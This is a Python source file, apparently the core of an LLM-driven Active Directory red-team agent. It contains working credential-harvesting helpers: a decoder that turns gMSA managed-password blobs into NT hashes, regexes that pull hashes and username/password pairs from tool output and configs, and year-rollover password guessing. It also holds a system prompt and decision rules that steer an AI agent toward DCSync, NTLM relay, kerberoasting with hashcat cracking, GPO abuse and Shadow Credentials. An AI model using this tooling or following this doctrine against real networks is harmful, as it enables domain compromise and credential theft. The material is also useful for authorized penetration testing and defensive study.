"""
modules/agent/_core.py
Core implementation — utilities, exec helpers, intelligence, prompts, tools, and loops.

This is the main body of the former red_team_agent.py.  The following sections
have been extracted into dedicated submodules:
  • constants.py  — all configuration constants
  • backends.py   — Ollama API caller
  • logger.py     — AgentMarkdownLog class

Planned future splits (see CONTRIBUTING.md):
  • utils.py        — small utility functions
  • exec_helpers.py — _run / _nxc / auth helpers
  • intel.py        — skills, analysis, system prompts
  • tools.py        — all tool_* handlers
  • loops.py        — orchestration loops + run()
"""
import os, sys, json, subprocess, shutil, re, time, secrets, string, base64, struct, shlex
from pathlib import Path
from datetime import datetime
from types import SimpleNamespace

try:
    import anthropic
    _HAS_ANTHROPIC = True
except ImportError:
    _HAS_ANTHROPIC = False

from utils.helpers import (
    print_banner, section, success, warn, info, error, pause,
    add_finding, dedupe_findings, run_cmd, shell_quote, fg, BOLD, DIM, RST,
    NEON_GRN, NEON_CYN, NEON_RED, NEON_YEL, NEON_PUR,
    BABY_BLUE, LIGHT_PINK, SOFT_PINK, PURE_WHITE, SOFT_WHITE,
    imp, _SYSPY, _IMP_DIR,
)
from config.settings import (
    SESSION, OUTPUT_DIR, save_session, redact_obj, redact_text, SHOW_SECRETS,
    reset_engagement_state, reset_session_for_target_change,
)

# ── Package submodule imports ─────────────────────────────────────────────────
from modules.agent.constants import (
    MODEL, MAX_TOKENS, MAX_ROUNDS,
    LOG_DIR, AGENT_RUNTIME_DIR,
    AGENT_CLEAN_OUTPUT_ON_START, AGENT_ARCHIVE_OLD_RUNS, AGENT_LIVE_COMMANDS,
    OLLAMA_API_TIMEOUT, OLLAMA_MAX_TOOLS,
    OLLAMA_SHOW_FALLBACK_WARNINGS, OLLAMA_FORCE_LLM_DECISION,
    OPSEC_MODE, LDAP_PORT, LDAPS_PORT, SMB_PORT, WINRM_PORT,
    AGENT_BLUE, AGENT_PINK, AGENT_TEXT, AGENT_WHITE,
)
from modules.agent.backends import _ollama_chat_completion
from modules.agent.logger import AgentMarkdownLog

_IMPACKET_PYTHON = _SYSPY  # /usr/bin/python3 — has pip impacket in ~/.local


# ── Functions extracted from original lines 120-205 ──────────────────────────

def _check_runtime_ownership() -> None:
    """Refuse to run if the agent dirs were created by a previous root run.

    Symptom: dirs owned by root:root with mode 755 block the regular user from
    writing per-run reports, and bloodyAD invoked via root cannot import the
    user-site bloodyAD package — both presented as cryptic mid-run failures.
    """
    import os as _os, sys as _sys
    if _os.geteuid() == 0:
        _sys.stderr.write(
            "[FATAL] Do not run this agent with sudo.\n"
            "        Tools like bloodyAD live in your user-site (~/.local/lib/...)\n"
            "        and cannot be imported by root. Run as your normal user.\n"
        )
        _sys.exit(2)
    bad = []
    for _d in (LOG_DIR, AGENT_RUNTIME_DIR):
        try:
            _st = _os.stat(_d)
            if _st.st_uid != _os.getuid() or not _os.access(_d, _os.W_OK):
                bad.append(str(_d))
        except FileNotFoundError:
            continue
    if bad:
        _sys.stderr.write(
            "[FATAL] Output dirs are owned by another user (likely a previous\n"
            "        sudo run) — agent cannot write reports.\n"
            "        Fix once with:\n"
            f"          sudo chown -R $(id -u):$(id -g) {OUTPUT_DIR}\n"
            f"        Affected: {bad}\n"
        )
        _sys.exit(2)


def _clean_agent_output_for_new_run(run_id: str) -> None:
    """Start each agent run with clean runtime state while preserving evidence."""
    if not AGENT_CLEAN_OUTPUT_ON_START:
        return

    removed_runtime = 0
    archived_logs   = 0

    AGENT_RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    for item in list(AGENT_RUNTIME_DIR.iterdir()):
        try:
            if item.is_dir():
                shutil.rmtree(item)
            else:
                item.unlink()
            removed_runtime += 1
        except Exception as exc:
            warn(f"[Agent cleanup] Could not remove runtime item {item}: {exc}")

    LOG_DIR.mkdir(parents=True, exist_ok=True)
    old_logs = [
        p for p in LOG_DIR.iterdir()
        if p.is_file() and p.name.startswith("agent_") and p.suffix.lower() in {".md", ".json"}
    ]
    if old_logs:
        if AGENT_ARCHIVE_OLD_RUNS:
            archive_dir = LOG_DIR / "archive" / run_id
            archive_dir.mkdir(parents=True, exist_ok=True)
            for path in old_logs:
                try:
                    shutil.move(str(path), str(archive_dir / path.name))
                    archived_logs += 1
                except Exception as exc:
                    warn(f"[Agent cleanup] Could not archive log {path}: {exc}")
        else:
            for path in old_logs:
                try:
                    path.unlink()
                    archived_logs += 1
                except Exception as exc:
                    warn(f"[Agent cleanup] Could not remove log {path}: {exc}")

    if removed_runtime or archived_logs:
        action = "archived" if AGENT_ARCHIVE_OLD_RUNS else "removed"
        info(f"[Agent cleanup] runtime items removed={removed_runtime}, old logs {action}={archived_logs}")


# ─────────────────────────────────────────────────────────────────────────────

def _real_secret(value: str) -> str:
    """Return a credential/hash only if it is not a redaction placeholder."""
    v = str(value or "").strip()
    if v in {"", "***", "<redacted>", "redacted", "None", "null"}:
        return ""
    return v

def _real_nt_hash(value: str) -> str:
    v = _real_secret(value).split(":")[-1]
    return v if re.fullmatch(r"[a-fA-F0-9]{32}", v or "") else ""

def _md4_hexdigest(data: bytes) -> str:
    """Small MD4 implementation for NT hashes when Cryptodome is unavailable."""
    def _rol(value: int, bits: int) -> int:
        value &= 0xffffffff
        return ((value << bits) | (value >> (32 - bits))) & 0xffffffff

    msg = bytearray(data)
    bit_len = (8 * len(msg)) & 0xffffffffffffffff
    msg.append(0x80)
    while len(msg) % 64 != 56:
        msg.append(0)
    msg += struct.pack("<Q", bit_len)

    a, b, c, d = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
    for i in range(0, len(msg), 64):
        x = list(struct.unpack("<16I", msg[i:i + 64]))
        aa, bb, cc, dd = a, b, c, d

        def f(xv, yv, zv): return ((xv & yv) | (~xv & zv)) & 0xffffffff
        def g(xv, yv, zv): return ((xv & yv) | (xv & zv) | (yv & zv)) & 0xffffffff
        def h(xv, yv, zv): return (xv ^ yv ^ zv) & 0xffffffff

        def ff(av, bv, cv, dv, k, s):
            return _rol(av + f(bv, cv, dv) + x[k], s)

        def gg(av, bv, cv, dv, k, s):
            return _rol(av + g(bv, cv, dv) + x[k] + 0x5a827999, s)

        def hh(av, bv, cv, dv, k, s):
            return _rol(av + h(bv, cv, dv) + x[k] + 0x6ed9eba1, s)

        for k in range(0, 16, 4):
            a = ff(a, b, c, d, k, 3)
            d = ff(d, a, b, c, k + 1, 7)
            c = ff(c, d, a, b, k + 2, 11)
            b = ff(b, c, d, a, k + 3, 19)

        for k in (0, 1, 2, 3):
            a = gg(a, b, c, d, k, 3)
            d = gg(d, a, b, c, k + 4, 5)
            c = gg(c, d, a, b, k + 8, 9)
            b = gg(b, c, d, a, k + 12, 13)

        for k in (0, 2, 1, 3):
            a = hh(a, b, c, d, k, 3)
            d = hh(d, a, b, c, k + 8, 9)
            c = hh(c, d, a, b, k + 4, 11)
            b = hh(b, c, d, a, k + 12, 15)

        a = (a + aa) & 0xffffffff
        b = (b + bb) & 0xffffffff
        c = (c + cc) & 0xffffffff
        d = (d + dd) & 0xffffffff

    return struct.pack("<4I", a, b, c, d).hex()

def _decode_gmsa_managed_password_blob(blob_b64: str) -> str:
    """Return the NT hash from a base64 msDS-ManagedPassword blob."""
    try:
        data = base64.b64decode(str(blob_b64).strip(), validate=True)
        if len(data) < 16:
            return ""
        (_version, _reserved, length, current_offset, previous_offset,
         query_offset, _unchanged_offset) = struct.unpack("<HHIHHHH", data[:16])
        if length and length > len(data):
            return ""
        end = previous_offset or query_offset
        if current_offset < 16 or end <= current_offset or end > len(data):
            return ""
        current_password = data[current_offset:end]
        if current_password.endswith(b"\x00\x00"):
            current_password = current_password[:-2]
        try:
            from binascii import hexlify
            from Cryptodome.Hash import MD4
            ntlm_hash = MD4.new()
            ntlm_hash.update(current_password)
            return hexlify(ntlm_hash.digest()).decode("utf-8")
        except Exception:
            return _md4_hexdigest(current_password)
    except Exception:
        return ""

def _extract_gmsa_hashes_from_text(text: str) -> dict:
    """Extract gMSA NT hashes from dumper lines and raw bloodyAD blobs."""
    result = str(text or "")
    hashes: dict[str, str] = {}
    lm_sentinel = "aad3b435b51404eeaad3b435b51404ee"

    patterns = [
        r"([A-Za-z0-9_.-]+\$):::(?:[a-f0-9]{32}:)?([a-f0-9]{32})(?::::)?",
        r"([A-Za-z0-9_.-]+\$)\s+[a-f0-9]{32}:([a-f0-9]{32})",
        r"([A-Za-z0-9_.-]+\$).*?(?:NT(?:LM)?(?:\s+hash)?|NTHash|rc4|hash)\s*[:=]\s*([a-f0-9]{32})",
    ]
    for pat in patterns:
        for m in re.finditer(pat, result, re.I):
            acct, nt = m.group(1), m.group(2).lower()
            if nt != lm_sentinel:
                hashes[acct] = nt

    for m in re.finditer(r"msDS-ManagedPassword\s*:\s*([A-Za-z0-9+/=]{40,})", result, re.I):
        nt = _decode_gmsa_managed_password_blob(m.group(1))
        if not nt:
            continue
        ctx = result[max(0, m.start() - 500):m.end() + 500]
        sam_matches = list(re.finditer(r"sAMAccountName\s*:\s*([A-Za-z0-9_.-]+\$)", ctx, re.I))
        if sam_matches:
            acct = sam_matches[-1].group(1)
        else:
            dn = re.search(r"CN=([A-Za-z0-9_.-]+),CN=Managed Service Accounts", ctx, re.I)
            acct = f"{dn.group(1)}$" if dn else ""
        if acct:
            hashes[acct] = nt
    return hashes

def _valid_gmsa_hashes(hashes: dict) -> dict:
    """Keep only account$ -> real NT hash pairs."""
    clean = {}
    for acct, nt in (hashes or {}).items():
        acct_s = str(acct or "").strip()
        nt_s = _real_nt_hash(str(nt or ""))
        if acct_s.endswith("$") and nt_s:
            clean[acct_s] = nt_s
    return clean

def _compact_tool_failure(text: str, max_chars: int = 900) -> str:
    """Keep tool failures readable so fallback evidence is not hidden."""
    raw = _strip_ansi(str(text or "").strip())
    if not raw:
        return raw
    lines = [l.rstrip() for l in raw.splitlines()]
    if "Traceback (most recent call last)" not in raw:
        return raw[:max_chars]
    useful = [
        l for l in lines
        if re.search(r"(error|exception|failed|denied|invalid|expired|timeout|ldap|kerberos|ntlm)",
                     l, re.I)
    ]
    tail = useful[-8:] if useful else lines[-8:]
    filtered = []
    for line in tail:
        if "Traceback (most recent call last)" in line:
            continue
        if re.match(r"\s*File\s+\".*\"", line):
            continue
        filtered.append(line.strip())
    return "Tool failed; continuing with fallback checks.\n" + "\n".join(filtered)[:max_chars]

def _runtime_path(name: str) -> Path:
    safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", str(name or "agent")).strip("._")
    AGENT_RUNTIME_DIR.mkdir(parents=True, exist_ok=True)
    return AGENT_RUNTIME_DIR / safe

def _ccache_is_valid(ccache: str, username: str = "", domain: str = "") -> bool:
    if not ccache or not Path(ccache).exists():
        return False
    expected = ""
    if username and domain:
        principal_user = username.split("@")[0].split("\\")[-1]
        expected = f"{principal_user}@{domain.upper()}"

    def _principal_matches(output: str) -> bool:
        if not expected:
            return True
        m = re.search(r"Default principal:\s*([^\s]+)", output or "", re.I)
        return bool(m and m.group(1).lower() == expected.lower())

    try:
        r = subprocess.run(
            ["klist", "-c", ccache],
            capture_output=True, text=True, timeout=5,
        )
        out = f"{r.stdout}\n{r.stderr}"
        return (
            r.returncode == 0
            and _principal_matches(out)
            and ("krbtgt/" in out or "Default principal:" in out)
            and "Expired" not in out
            and "expired" not in out
            and "No credentials cache" not in out
        )
    except Exception:
        return False


def _active_priv_ccache(username: str = "", domain: str = "") -> str:
    """Return the verified privileged ADCS ccache when shell-ready, else "".
    request_tgt and other Kerberos flows mutate SESSION['krb5_ccache'] and can
    downgrade it back to a plain (unprivileged) user TGT. This stable pointer —
    set only after a validated certipy-auth — lets WinRM/lateral tools use the
    PAC-injected (e.g. ESC13 OID-linked group) ticket instead of the plain TGT,
    which is what makes the shell actually work. Target-agnostic."""
    intel = _agent_intel()
    cc = intel.get("adcs_ccache", "")
    if intel.get("adcs_shell_ready") and cc and _ccache_is_valid(cc, username, domain):
        return cc
    return ""

def _session_kerberos_usable(username: str = "", domain: str = "") -> bool:
    """True only when Kerberos mode has an existing, non-expired ccache."""
    ccache = SESSION.get("krb5_ccache", "")
    if not (SESSION.get("use_kerberos") and ccache):
        return False
    ok = _ccache_is_valid(ccache, username=username, domain=domain)
    if not ok:
        SESSION["use_kerberos"] = False
        SESSION["krb5_ccache"] = ""
    return ok

def _add_owned_machine(machine, **attrs) -> None:
    """Record an owned host, deduped by machine identity (target-agnostic).

    Several tools (evil_winrm, lateral_movement, discover_winrm_access,
    shadow_credentials, ...) can each pwn the SAME host, every time with a
    slightly different dict (method/time/user). Appending blindly inflated the
    list — and the report's machine count — with duplicate entries for one box.
    Dedup on the normalized 'machine' value; if it already exists, merge in any
    new non-empty attributes (e.g. fill nt_hash/method) instead of appending a
    copy."""
    machine = str(machine or "").strip()
    if not machine:
        return
    bucket = SESSION.setdefault("owned_machines", [])
    key = machine.lower()
    for entry in bucket:
        if str(entry.get("machine", "")).strip().lower() == key:
            for k, v in attrs.items():
                if v and not entry.get(k):
                    entry[k] = v
            return
    bucket.append({"machine": machine, **attrs})

BAD_AD_TARGETS = {
    "", "none", "null", "undefined", "found", "target", "user", "computer",
    "account", "unknown", "all", "true", "false", "guest", "krbtgt",
    "administrator", "domain users", "domain admins", "enterprise admins",
    "schema admins", "builtin", "authenticated users", "everyone",
    "microsoftdns", "domaindnszones", "forestdnszones", "system", "configuration",
    "schema", "users", "computers", "managed service accounts", "program data",
    "that", "this", "the", "object", "container", "zone", "zones",
}

def _valid_ad_target(value: str, allow_admin: bool = False) -> bool:
    v = str(value or "").strip().strip("'\"")
    vl = v.lower()
    if re.fullmatch(r"s-\d-\d+(?:-\d+)+", vl):
        return False
    if vl in BAD_AD_TARGETS:
        return False
    if vl.startswith("s-1-"):
        return False
    if not allow_admin and any(x in vl for x in ("guest", "krbtgt")):
        return False
    if len(v) < 3:
        return False
    return bool(re.search(r"[A-Za-z0-9]", v))

def _real_user_target(value: str) -> bool:
    """True only for plausible user sAMAccountName targets, not containers/gMSA/computers."""
    v = str(value or "").strip().strip("'\"")
    vl = v.lower()
    if not _valid_ad_target(v):
        return False
    if v.endswith("$") or _known_gmsa_name(v):
        return False
    if any(token in vl for token in (
        "dns", "zone", "container", "domain", "forest", "builtin", "policy",
    )):
        return False
    return bool(re.fullmatch(r"[A-Za-z][A-Za-z0-9_.-]{2,63}", v))

def _same_ad_account(left: str, right: str) -> bool:
    """Compare AD account names after stripping DOMAIN\\ and UPN wrappers."""
    def _norm(value: str) -> str:
        v = str(value or "").strip().strip("'\"").lower()
        v = v.split("@")[0].split("\\")[-1]
        return v
    return bool(_norm(left) and _norm(left) == _norm(right))

def _hash_for_account(account: str) -> str:
    """Return a known NT hash for an account from loot/intel/owned users."""
    acct = str(account or "").strip()
    if not acct:
        return ""
    intel = SESSION.get("agent_intel", {}) or {}
    sources = []
    sources.extend((SESSION.get("loot", {}) or {}).items())
    sources.extend((intel.get("gmsa_hashes", {}) or {}).items())
    sources.extend((intel.get("nt_hashes", {}) or {}).items())
    for owned in SESSION.get("owned_users", []) or []:
        sources.append((owned.get("user", ""), owned.get("nt_hash", "")))
    for candidate, value in sources:
        if _same_ad_account(acct, candidate):
            nt = _real_nt_hash(value)
            if nt:
                return nt
    return ""

def _password_year_variants(password: str) -> list[str]:
    """Generate conservative year-rollover variants for leaked stale passwords."""
    variants = []
    for match in re.findall(r"(20\d\d)", str(password or "")):
        year = int(match)
        for delta in (1, -1, 2):
            candidate = str(password).replace(match, str(year + delta), 1)
            if candidate != password and candidate not in variants:
                variants.append(candidate)
    return variants

def _extract_creds_from_text(content: str) -> list[dict]:
    """Extract likely username/password pairs from logs/configs without target-specific names."""
    text = str(content or "")
    user_patterns = [
        re.compile(r'\bBindUser\b\s*[:=]\s*["\']?([^"\'\r\n,}{]+)', re.I),
        re.compile(r'\b(?:username|user|account|login)\b\s*[:=]\s*["\']?([^"\'\s\r\n,}{]+)', re.I),
    ]
    pass_patterns = [
        re.compile(r'\bBindPass\b\s*[:=]\s*["\']?([^"\'\s\r\n,}{]+)', re.I),
        re.compile(r'\b(?:password|passwd|pwd|pass)\b\s*[:=]\s*["\']?([^"\'\s\r\n,}{]{6,128})', re.I),
    ]
    users, passwords = [], []
    for pat in user_patterns:
        for match in pat.finditer(text):
            value = match.group(1).strip().strip('"\'').split("\\")[-1].split("@")[0]
            if _valid_ad_target(value) and value not in users:
                users.append(value)
    for pat in pass_patterns:
        for match in pat.finditer(text):
            value = match.group(1).strip().strip('"\'')
            if 6 <= len(value) <= 128 and value not in passwords:
                passwords.append(value)
    return [{"user": user, "password": pw} for user in users for pw in passwords]

def _known_gmsa_name(value: str) -> str:
    """Return canonical gMSA name from intel, accepting names with or without '$'."""
    stem = str(value or "").strip().strip("'\"").lower().rstrip("$")
    if not stem:
        return ""
    intel = SESSION.get("agent_intel", {}) or {}
    candidates = list(intel.get("gmsa_candidates", []) or [])
    candidates += list((intel.get("gmsa_hashes", {}) or {}).keys())
    for _right, target in intel.get("acl_paths", []) or []:
        if str(target).strip().strip("'\"").endswith("$"):
            candidates.append(str(target).strip().strip("'\""))
    for candidate in candidates:
        c = str(candidate or "").strip().strip("'\"")
        if c.lower().rstrip("$") == stem:
            return c if c.endswith("$") else f"{c}$"
    return ""

def _canonical_acl_target(target: str) -> str:
    """Canonicalize ACL targets using known object type intel."""
    t = str(target or "").strip().strip("'\"")
    gmsa = _known_gmsa_name(t)
    return gmsa or t

def _gmsa_write_edges() -> list[tuple[str, str]]:
    """Return canonical gMSA write edges from ACL intel."""
    edges = []
    for right, target in (SESSION.get("agent_intel", {}) or {}).get("acl_paths", []) or []:
        right_l = str(right).lower()
        if not any(x in right_l for x in ("genericwrite", "genericall", "writedacl", "writeowner", "writeproperty")):
            continue
        canonical = _canonical_acl_target(str(target))
        if canonical.endswith("$"):
            item = (str(right), canonical)
            if item not in edges:
                edges.append(item)
    return edges

def _acl_right_for_target(target: str, rights: tuple[str, ...] = ()) -> str:
    """Return the stored ACL right for a target only when intel has evidence."""
    target_stem = str(target or "").strip().strip("'\"").lower().rstrip("$")
    if not target_stem:
        return ""
    for right, candidate in (SESSION.get("agent_intel", {}) or {}).get("acl_paths", []) or []:
        cand_stem = str(candidate or "").strip().strip("'\"").lower().rstrip("$")
        if cand_stem != target_stem:
            continue
        right_s = str(right)
        if not rights or any(token in right_s.lower() for token in rights):
            return right_s
    return ""

def _extract_bloodyad_candidate_dn(text: str) -> str:
    m = re.search(r"found entries that could match:\s*\[([^\]]+)\]", text or "", re.I)
    if not m:
        return ""
    dn_m = re.search(r"CN=[^'\"]+", m.group(1), re.I)
    return dn_m.group(0).strip() if dn_m else ""

def _reset_agent_runtime_state() -> None:
    """Keep each agent report tied to evidence from the current run."""
    keep_kerberos = {
        "use_kerberos": SESSION.get("use_kerberos", False),
        "krb5_ccache": SESSION.get("krb5_ccache", ""),
        "krb5_config": SESSION.get("krb5_config", "/etc/krb5.conf"),
    }
    reset_engagement_state()
    SESSION.update(keep_kerberos)

def _redact_args_for_display(args: dict) -> dict:
    """Display real secrets when enabled, but never present *** as a real value."""
    safe = {}
    for k, v in (args or {}).items():
        lk = str(k).lower()
        if lk in {"password", "attacker_pass", "neo4j_password"}:
            real = _real_secret(v)
            safe[k] = real if SHOW_SECRETS else ("***" if real else "")
        elif lk in {"nt_hash", "hash", "hashes", "lmhash", "nthash"}:
            real_hash = _real_nt_hash(v)
            safe[k] = real_hash if SHOW_SECRETS else ("***" if real_hash else "")
        else:
            safe[k] = v
    return safe

def _json_safe(value):
    """Convert runtime helper objects (Path, sets, custom keys) into JSON-safe data."""
    if isinstance(value, dict):
        return {str(k): _json_safe(v) for k, v in value.items()}
    if isinstance(value, (list, tuple, set)):
        return [_json_safe(v) for v in value]
    if isinstance(value, Path):
        return str(value)
    return value

def _format_arg_value(value, max_len: int = 96) -> str:
    if value in ("", None, [], {}):
        return "-"
    if isinstance(value, bool):
        text = "yes" if value else "no"
    elif isinstance(value, (list, tuple, dict)):
        text = json.dumps(_json_safe(value), ensure_ascii=False, default=str)
    else:
        text = str(value)
    text = text.replace("\n", " ").strip()
    if len(text) > max_len:
        text = text[:max_len - 12] + " ...[cut]"
    return text

def _print_tool_args(title: str, args: dict) -> None:
    """Human-readable console display for tool arguments."""
    safe = _redact_args_for_display(args)
    if not safe:
        info(f"{title}: none")
        return
    print(f"  {AGENT_BLUE}[*]{RST} {BOLD}{AGENT_WHITE}{title}{RST}")
    preferred = [
        "target_ip", "dc_ip", "domain", "dc_fqdn", "username", "password",
        "nt_hash", "target_user", "target_account", "owned_user", "command",
        "method", "auto_exploit",
    ]
    keys = [k for k in preferred if k in safe] + sorted(k for k in safe if k not in preferred)
    width = min(max(len(str(k)) for k in keys), 18)
    for key in keys:
        print(f"  {AGENT_PINK}│{RST} {AGENT_BLUE}{str(key).ljust(width)}{RST} : {AGENT_TEXT}{_format_arg_value(safe[key])}{RST}")


def _agent_live_status(message: str) -> None:
    """Print an immediately flushed agent progress line for long blocking work."""
    print(f"  {AGENT_BLUE}[*]{RST} {AGENT_TEXT}{message}{RST}", flush=True)


_DIAGNOSTIC_PREFIXES = (
    "klist ",
    "klist\n",
    "kvno ",
    "ldapsearch -x -H ldap://",   # rootDSE currentTime probes
    "curl -s",                     # DC time probes
    "curl -sk",
)

def _record_agent_command(cmd: str) -> None:
    """Track commands executed by the agent for console and Markdown reporting.

    Internal diagnostic commands (klist, kvno, DC-time probes) are not
    recorded so the report stays focused on real attack commands.
    """
    clean = redact_text(str(cmd or "").strip())
    if not clean:
        return
    # Skip diagnostic / noise commands
    lower = clean.lstrip()
    if any(lower.startswith(p) for p in _DIAGNOSTIC_PREFIXES):
        return
    # Skip KRB5CCNAME=... klist ... wrappers
    if "klist" in lower[:80] and "KRB5CCNAME" in lower[:80]:
        return
    if AGENT_LIVE_COMMANDS:
        print(f"  {AGENT_BLUE}[run]{RST} {AGENT_TEXT}{clean}{RST}", flush=True)
    try:
        SESSION.setdefault("commands_run", []).append({
            "cmd": clean,
            "time": str(datetime.now()),
            "source": "agent",
        })
    except Exception:
        pass


def _command_log_index() -> int:
    return len(SESSION.get("commands_run", []) or [])


def _commands_since(start_index: int) -> list[str]:
    commands = []
    for item in (SESSION.get("commands_run", []) or [])[max(start_index, 0):]:
        cmd = item.get("cmd") if isinstance(item, dict) else str(item)
        cmd = redact_text(str(cmd or "").strip())
        if cmd:
            commands.append(cmd)
    return commands


def _command_preview_for_tool(tool_name: str, args: dict | None = None) -> list[str]:
    args = args or {}
    if tool_name == "agent_complete":
        status = args.get("status", "complete")
        return [f"internal: agent_complete status={status}"]
    if args.get("command"):
        return [str(args.get("command"))]
    return [f"internal: {tool_name}"]


def _print_tool_commands(tool_name: str, commands: list[str], args: dict | None = None) -> None:
    shown = commands or _command_preview_for_tool(tool_name, args)
    print(f"  {AGENT_BLUE}[*]{RST} {BOLD}{AGENT_WHITE}Command{RST}")
    for cmd in shown[:8]:
        print(f"  {AGENT_PINK}│{RST} {AGENT_TEXT}{cmd}{RST}")
    if len(shown) > 8:
        print(f"  {AGENT_PINK}│{RST} {DIM}[...{len(shown) - 8} more commands]{RST}")

OPERATOR_DOCTRINE = """
## SENIOR ACTIVE DIRECTORY OPERATOR DOCTRINE

Operate like a disciplined professional red team lead, not a command generator.
Your job is to convert evidence into the shortest authorized path to impact while
preserving useful notes for reporting and deconfliction.

Core habits:
- Validate assumptions with one concrete check before spending rounds on a path.
- Prefer high-signal enumeration: LDAP, SMB shares, ADCS, BloodHound, ACLs, Kerberos.
- Keep a working hypothesis: initial foothold, credential path, privilege path, objective.
- Treat each result as evidence. Extract users, groups, hosts, SPNs, ACL edges, cert templates,
  delegation, trusts, readable shares, hashes, tickets, and shell access.
- Choose the next action by impact, reliability, and prerequisites. Do not run noisy actions
  when a cleaner confirmed path exists.
- After new credentials, immediately test them across SMB, LDAP, and WinRM. For WinRM,
  discover the host that accepts the credential instead of assuming the DC is the shell target.
- After shell access, identify token/group context, host role, local admin scope, credential
  material, and reachable next hops before attempting broad movement.
- Non-admin WinRM is still a foothold. If the token is a service account, gMSA, or Remote
  Management Users member, run Windows local privesc recon before reporting partial success:
  scheduled tasks, run-as users, writable ProgramData/Program Files update paths, ADCS
  enrollment rights, WSUS policy, DNS control, and MachineAccountQuota.
- Maintain reporting quality: every meaningful finding needs evidence, risk, and remediation.

Decision discipline:
- If a tool fails because of authentication, change auth mode or credential, not the same tool.
- If NTLM is blocked, move to Kerberos with request_tgt and FQDN-based access.
- If ADCS is present, enumerate templates before guessing an ESC path.
- If ACL abuse is found, pick the least complex edge that reaches DA, a high-value admin,
  a computer account, or a gMSA.
- If a hash or ccache is obtained, test access immediately before continuing enumeration.
- If WSUS is present on 8530/8531, check WindowsUpdate policy, DNS target control, and whether
  a server-auth certificate can be enrolled for the WSUS hostname.
- If no path is found after core enumeration, collect BloodHound and hunt for shares/history.
"""

# ══════════════════════════════════════════════════════════════════════════════
#  SAST SKILLS KNOWLEDGE BASE — loaded from ActiveDirectory-SAST/*.yml
# ══════════════════════════════════════════════════════════════════════════════

def _load_sast_skills() -> dict:
    """
    Load and parse all SAST YAML files into a structured skills dict.
    Returns {category: [techniques]} with commands, severity, MITRE.
    """
    import re as _re
    # _core.py lives at modules/agent/_core.py; the SAST knowledge base sits at
    # the repo root (ActiveDirectory-SAST/). parents[2] = repo root.
    # (.parent.parent pointed at modules/ — which never existed — so the entire
    # 93-technique knowledge base silently loaded as empty: _TOTAL_TECHNIQUES=0.)
    sast_dir = Path(__file__).resolve().parents[2] / "ActiveDirectory-SAST"
    skills: dict = {}

    if not sast_dir.exists():
        return skills

    for f in sorted(sast_dir.glob("*.yml")):
        if f.stem in ("README", "tool_sast_analysis"):
            continue
        try:
            content = f.read_text()
        except Exception:
            continue
        cat = f.stem.replace("_", " ").title()
        techniques = []

        blocks = _re.split(r'\n  - id:', content)
        for block in blocks[1:]:
            lines = block.split('\n')
            rule_id  = lines[0].strip()
            title_m  = _re.search(r'title:\s*(.+)', block)
            sev_m    = _re.search(r'severity:\s*(\w+)', block)
            tech_m   = _re.search(r'technique:\s*(\S+)', block)
            desc_m   = _re.search(r'description:\s*>\s*\n(.*?)(?=\n    \w|\n  \w)', block, _re.S)

            tools_raw = _re.search(r'tools_used:\s*\n(.*?)(?=\n    \w+:|\n  \w+:|\Z)', block, _re.S)
            tools = []
            if tools_raw:
                for line in tools_raw.group(1).split('\n'):
                    line = line.strip().lstrip('- "').rstrip('"')
                    if line and not line.startswith('#') and len(line) > 5:
                        tools.append(line)

            remed_raw = _re.search(r'remediation:\s*\n(.*?)(?=\n    \w+:|\n  \w+:|\Z)', block, _re.S)
            remediation = []
            if remed_raw:
                for line in remed_raw.group(1).split('\n'):
                    line = line.strip().lstrip('- "').rstrip('"')
                    if line and not line.startswith('#') and len(line) > 5:
                        remediation.append(line)

            desc = ''
            if desc_m:
                desc = ' '.join(desc_m.group(1).split()).strip()[:250]

            title = title_m.group(1).strip() if title_m else ''
            if not title:
                continue

            techniques.append({
                'id':          rule_id,
                'title':       title,
                'severity':    sev_m.group(1).strip().upper() if sev_m else 'MEDIUM',
                'mitre':       tech_m.group(1).strip() if tech_m else '',
                'description': desc,
                'commands':    tools[:6],
                'detection':   remediation[:2],
            })

        if techniques:
            skills[cat] = techniques

    return skills


# Load skills at module import time
SAST_SKILLS: dict = _load_sast_skills()
_TOTAL_TECHNIQUES = sum(len(v) for v in SAST_SKILLS.values())


def _build_skills_prompt() -> str:
    """
    Build a compact skills reference for the system prompt.
    Shows every technique title + key commands — teaches the agent
    exactly what to do and how to do it.
    """
    lines = [
        f"## RED TEAM SKILLS KNOWLEDGE BASE ({_TOTAL_TECHNIQUES} Techniques)",
        "",
        "You have mastered the following AD attack techniques. ",
        "Use them strategically based on what you discover.",
        "",
    ]

    sev_emoji = {"CRITICAL": "🔴", "HIGH": "🟠", "MEDIUM": "🟡", "LOW": "🟢"}

    for cat, techniques in sorted(SAST_SKILLS.items()):
        crits = [t for t in techniques if t['severity'] in ('CRITICAL', 'HIGH')]
        lines.append(f"### {cat.upper()} ({len(techniques)} techniques)")
        for t in techniques:
            e = sev_emoji.get(t['severity'], '⚪')
            lines.append(f"**{e} {t['title']}** [{t['mitre']}]")
            if t['description']:
                lines.append(f"  → {t['description'][:150]}")
            for cmd in t['commands'][:3]:
                if len(cmd) > 10:
                    lines.append(f"  `{cmd[:120]}`")
            lines.append("")

    lines += [
        "## DECISION RULES (based on skill set above)",
        "",
        "- If you find WriteDACL/GenericAll on domain → grant DCSync rights first",
        "- If SMB signing disabled → always try NTLM relay (Responder + ntlmrelayx)",
        "- If ADCS found → certipy find -vulnerable first, exploit highest ESC",
        "- If unconstrained delegation host exists → coerce DC auth to capture TGT",
        "- If gMSA or computer account writable → Shadow Credentials chain",
        "- If SPN exists → kerberoast it, crack with hashcat -m 13100",
        "- If Protected Users (STATUS_ACCOUNT_RESTRICTION) → Kerberos only, use faketime",
        "- If GPO write access → immediate code execution via SharpGPOAbuse",
        "- If trust relationship exists → enumerate for ExtraSID/SID History attack",
        "- OPSEC: prefer read-only operations first; noisy ops only after confirming path",
        "",
    ]
    return '\n'.join(lines)


def _merge_agent_intel(intel: dict) -> None:
    """Persist normalized intel so fallback decisions can use prior evidence."""
    store = SESSION.setdefault("agent_intel", {})

    list_keys = [
        "users", "computers", "spns", "asrep_users", "admin_users", "esc_vulns",
        "winrm_access", "winrm_targets", "readable_shares", "creds_in_files", "acl_paths",
        "script_path_edges", "delegation", "ccaches", "flags", "valid_creds",
        "validated_creds",
        "wsus_servers", "local_privesc_hints", "gmsa_candidates",
        "gmsa_read_dead_for", "gmsa_read_tried_for", "acl_scan_dead_for",
        "desc_passwords", "valid_creds_tested",
    ]
